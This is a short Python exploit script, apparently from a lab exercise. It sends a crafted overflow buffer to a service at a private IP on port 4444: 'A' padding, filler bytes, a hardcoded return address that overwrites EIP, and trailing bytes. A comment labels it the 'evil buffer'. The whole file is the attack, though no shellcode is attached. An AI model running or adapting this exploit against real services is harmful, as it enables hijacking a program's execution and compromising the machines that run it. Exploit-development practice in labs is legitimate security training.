#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

a = b'\x41'*36
b = b'\x42'*4
c = b'\x43'*4
d = b'\x44'*4

eip = b'\x84\xE6\xF1\x77'

buffer = a + b + eip + d

connect=s.connect(('10.0.2.12', 4444)) # hardcoded IP address
s.recv(1024)
s.send(bytes('C \r\n', 'utf-8'))
s.recv(1024)
s.send(buffer + bytes('\r\n', 'utf-8'))
s.recv(1024)
s.send(bytes('y\r\n', 'utf-8')) # evil buffer
s.close()